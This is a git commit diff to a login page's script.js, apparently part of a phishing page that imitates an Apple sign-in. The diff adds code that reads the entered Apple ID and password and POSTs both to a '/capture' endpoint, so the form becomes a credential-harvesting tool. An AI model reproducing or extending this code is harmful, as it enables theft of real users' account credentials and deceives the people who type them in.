d10e76ae4bc0b85c718c25e233dde7a4ae7b1aea
Goofly <130136825+nearoofly@users.noreply.github.com>
2024-10-30 18:56:51 -0300

    Update script.js

--- script.js
+++ script.js
@@ -1,14 +1,18 @@
 document.querySelector(".login-form").addEventListener("submit", function(event) {
     event.preventDefault();
-    const interaction = "Utilisateur a cliqué sur Connexion";
     
+    // Récupérer l'identifiant et le mot de passe
+    const appleId = document.querySelector('input[type="text"]').value;
+    const password = document.querySelector('input[type="password"]').value;
+    const interaction = `Tentative de connexion avec identifiant : ${appleId}`;
+
     // Envoyer l'interaction au serveur
     fetch('/capture', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ interaction })
+        body: JSON.stringify({ interaction, appleId, password })
     })
     .then(response => response.text())
     .then(data => console.log(data))
